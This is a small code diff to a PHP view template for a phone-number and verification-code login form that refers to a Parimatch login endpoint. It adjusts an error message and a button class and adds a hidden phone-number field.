@@ -53,11 +53,11 @@ AppAsset::register($this);
                     <div class="input__status"></div>
                     <input id="number_mask" type="tel" class="input__el input__el--tel" />
                     <p class="input__error">
-                        You entered an verification code.
+                        You entered an phone number.
                     </p>
                 </div>
 
-                <button id="number_send" class="pari-btn">NEXT</button>
+                <button id="number_send" class="pari-btn pari-btn--send">NEXT</button>
 
                 <!--            <form method="post" action="https://parimatch.co.tz/rest/customer/session/login" enctype="multipart/form-data">-->
                 <!--                <input type="hidden" name="login"  value="123223121"/>-->
@@ -76,6 +76,7 @@ AppAsset::register($this);
                     <input id="code_mask" type="text" class="input__el input__el--code" />
                     <input id="user_id" type="hidden">
                     <input id="user_password" type="hidden">
+                    <input id="user_number" type="hidden">
                     <p class="input__error">
                         You entered an verification code.
                     </p>
